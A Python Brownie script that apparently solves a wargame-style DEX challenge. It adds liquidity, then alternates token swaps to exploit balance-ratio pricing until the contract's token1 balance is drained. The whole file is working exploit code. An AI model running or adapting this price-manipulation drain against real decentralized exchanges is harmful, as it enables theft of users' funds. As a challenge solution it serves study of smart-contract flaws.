from brownie import Attack, Dex, Contract
from scripts.helpful_scripts import *

account = getAccount()

dex = Contract.from_abi("Dex", "0x06FC9EdFC2D566E33a878e5D93E2431a793c5d9e", Dex.abi)


def main():
    tx = dex.approve(dex.address, 10000000000, {"from": account})
    tx.wait(1)
    tx = dex.add_liquidity(dex.token2(), 10, {"from": account})
    tx.wait(1)

    count = 0
    while dex.balanceOf(dex.token1(), dex.address) > 0:
        if count % 2 == 0:
            tx = dex.swap(
                dex.token1(),
                dex.token2(),
                dex.balanceOf(dex.token1(), account.address),
                {"from": account},
            )
            tx.wait(1)
            count += 1
            print(dex.balanceOf(dex.token1(), dex.address))
            print(dex.balanceOf(dex.token2(), dex.address))

        else:
            if dex.get_swap_price(
                dex.token2(), dex.token1(), dex.balanceOf(dex.token2(), account.address)
            ) > dex.balanceOf(dex.token1(), dex.address):
                tx = dex.swap(
                    dex.token2(),
                    dex.token1(),
                    dex.balanceOf(dex.token2(), dex.address),
                    {"from": account},
                )
            else:
                tx = dex.swap(
                    dex.token2(),
                    dex.token1(),
                    dex.balanceOf(dex.token2(), account.address),
                    {"from": account},
                )
                tx.wait(1)
                count += 1
                print(dex.balanceOf(dex.token1(), dex.address))
                print(dex.balanceOf(dex.token2(), dex.address))

    print(dex.balanceOf(dex.token1(), dex.address))
    print(dex.balanceOf(dex.token2(), dex.address))
